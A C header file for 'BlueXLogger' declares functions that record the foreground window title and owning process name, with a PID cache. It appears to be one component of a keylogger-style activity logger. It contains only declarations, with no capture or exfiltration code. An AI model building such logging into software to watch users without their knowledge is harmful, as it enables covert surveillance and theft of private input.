/*============================================================================
 * BlueXLogger - bxl_context.h
 * Foreground window title + owning process name resolution.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Process names are resolved through QueryFullProcessImageNameW with
 * PROCESS_QUERY_LIMITED_INFORMATION, which works without elevation for
 * same-user processes. Results are cached by PID because the foreground
 * window can change far more often than the process does.
 *==========================================================================*/
#ifndef BXL_CONTEXT_H
#define BXL_CONTEXT_H

#include "bxl_common.h"

#define BXL_CTX_TITLE_MAX 512
#define BXL_CTX_PROC_MAX  128
#define BXL_CTX_CACHE     32

typedef struct BxlContext {
    DWORD pid;
    char  process[BXL_CTX_PROC_MAX];
    char  title[BXL_CTX_TITLE_MAX];
    bxl_u64 updated_ms;
} BxlContext;

typedef struct BxlContextCache {
    struct {
        DWORD pid;
        char  name[BXL_CTX_PROC_MAX];
    } entries[BXL_CTX_CACHE];
    int count;
    int next;
} BxlContextCache;

void bxl_context_cache_init(BxlContextCache *c);

/* Query the current foreground window. Returns BXL_TRUE when a window was
 * found; `out` is always NUL-terminated and safe to log. */
int  bxl_context_get(BxlContextCache *cache, BxlContext *out);

/* True when process/title differ from the previous sample. */
int  bxl_context_changed(const BxlContext *a, const BxlContext *b);

/* Resolve a PID to its executable base name (cached). */
int  bxl_context_process_name(BxlContextCache *cache, DWORD pid,
                              char *out, size_t out_cch);

#endif /* BXL_CONTEXT_H */
